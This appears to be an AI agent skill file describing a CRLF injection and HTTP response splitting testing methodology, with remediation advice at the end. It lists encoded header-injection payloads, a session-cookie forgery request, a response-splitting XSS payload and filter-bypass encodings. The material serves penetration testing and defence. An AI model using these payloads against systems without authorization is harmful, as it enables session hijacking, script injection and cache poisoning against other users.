---
name: offensive-crlf
description: "CRLF injection and HTTP response splitting testing. Covers header injection via CR/LF in user input, response splitting to forge headers/bodies, log injection, and escalation to XSS, cache poisoning, and open redirect. Use when user input is reflected into response headers (Location, Set-Cookie) or logs."
---

# CRLF Injection — Offensive Testing Methodology

## Quick Workflow

1. Find inputs reflected into response headers (redirects, Set-Cookie, custom headers)
2. Inject encoded CR/LF (`%0d%0a`) and observe header structure
3. Forge new headers; escalate to response splitting, XSS, or cache poisoning
4. Test log sinks for log forging / poisoning

---

## Detection

### Core Payloads (URL-encoded)

```
%0d%0aSet-Cookie:crlftest=1
%0d%0aX-Injected:crlf
%0a%0dX-Injected:crlf
%E5%98%8A%E5%98%8D       # Unicode CR/LF normalization bypass
\r\n (raw, in JSON/body sinks)
```

Inspect raw response headers — a new `X-Injected` or `Set-Cookie` line confirms it.

### Common Sinks

- `Location:` from redirect parameters (`?url=`, `?next=`, `?return=`)
- `Set-Cookie:` from user-controlled cookie values
- Custom headers echoing request data
- Server/access logs (log injection)

---

## Exploitation

### Header Forgery

```
/redir?url=https://site/%0d%0aSet-Cookie:session=attacker
```

### Response Splitting → Reflected XSS

Split the response and inject a body when the platform forwards raw bytes:

```
%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### Cache Poisoning

Inject caching headers or a forged body so a shared cache stores the malicious
response and serves it to other users.

### Open Redirect / Session Fixation

Forge `Location:` or set a known session cookie via injected `Set-Cookie`.

---

## Bypass Tips

- Try `%0d`, `%0a` alone; some stacks act on either
- Double-encode (`%250d%250a`) when a proxy decodes once
- Unicode overlong / homoglyph CR-LF (`%E5%98%8A`) defeats naive `\r\n` filters

---

## Remediation

- Strip/reject CR (`\r`, `%0d`) and LF (`\n`, `%0a`) from values placed in headers
- Use framework APIs that encode header values; never concatenate raw input
- Validate redirect targets against an allow-list
- Encode user data before writing to logs
